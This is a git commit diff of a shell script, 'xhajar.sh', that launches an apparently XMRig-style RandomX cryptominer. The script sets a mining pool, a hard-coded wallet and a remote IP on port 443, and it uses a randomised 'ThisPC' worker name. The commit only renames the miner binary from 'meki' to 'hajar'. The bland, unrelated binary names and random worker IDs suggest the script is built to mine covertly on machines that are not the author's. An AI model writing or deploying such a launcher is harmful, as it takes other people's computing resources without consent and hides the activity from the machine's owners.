e549407003ac6399cf125e8d3ab8e718d7bd91db
renilo <88342640+renilo@users.noreply.github.com>
2021-09-03 12:07:39 +0700

    Update xhajar.sh

--- xhajar.sh
+++ xhajar.sh
@@ -2,6 +2,6 @@ POOL=ap.luckpool.net:3956
 
 WALLET=RR6U3T7Uz475i7gontznFLWikFsQan2wjC
 
-chmod +x meki
+chmod +x hajar
 
-./meki --donate-level 1 -a rx/0 -o 208.113.200.73:443 -u ThisPC.$(echo $(shuf -i 1-9999999 -n 1)) -p x -k -t 4
+./hajar --donate-level 1 -a rx/0 -o 208.113.200.73:443 -u ThisPC.$(echo $(shuf -i 1-9999999 -n 1)) -p x -k -t 4
